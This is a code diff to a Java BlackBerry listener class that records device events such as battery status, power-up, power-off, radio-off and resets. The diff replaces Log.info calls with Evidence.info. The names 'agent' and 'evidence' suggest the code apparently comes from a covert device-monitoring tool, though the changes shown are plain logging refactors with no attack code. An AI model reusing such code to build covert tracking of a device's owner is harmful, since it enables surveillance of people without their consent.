@@ -30,6 +30,7 @@ import net.rim.device.api.system.SystemListener2;
 import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
@@ -37,7 +38,6 @@ import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.CallListObserver;
 import blackberry.interfaces.PhoneCallObserver;
 import blackberry.interfaces.Singleton;
-import blackberry.log.Log;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -170,7 +170,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("batteryGood");
         //#endif
 
-        Log.info("BatteryGood");
+        Evidence.info("BatteryGood");
     }
 
     /*
@@ -182,7 +182,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("batteryLow");
         //#endif
 
-        Log.info("BatteryLow");
+        Evidence.info("BatteryLow");
     }
 
     /*
@@ -362,7 +362,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
      * @see net.rim.device.api.system.SystemListener#powerOff()
      */
     public void powerOff() {
-        Log.info("PowerOff");
+        Evidence.info("PowerOff");
         //#ifdef DEBUG
         debug.info("powerOff");
         //#endif
@@ -373,7 +373,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
      * @see net.rim.device.api.system.SystemListener#powerUp()
      */
     public void powerUp() {
-        Log.info("PowerUp");
+        Evidence.info("PowerUp");
         //#ifdef DEBUG
         debug.info("powerUp");
         //#endif
@@ -388,7 +388,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("radioTurnedOff");
         //#endif
 
-        Log.info("RadioTurnedOff");
+        Evidence.info("RadioTurnedOff");
     }
 
     /*
@@ -465,7 +465,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("fastReset");
         //#endif
 
-        Log.info("Fast Reset");
+        Evidence.info("Fast Reset");
     }
 
     /*
@@ -477,7 +477,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
         debug.info("powerOffRequested: " + reason);
         //#endif
 
-        Log.info("Power Off Requested");
+        Evidence.info("Power Off Requested");
 
     }
 
@@ -801,7 +801,7 @@ public final class AppListener extends Listener implements RadioStatusListener,
     }
 
     public void reset() {
-        Log.info("Reset");
+        Evidence.info("Reset");
     }
 
     private synchronized void init() {
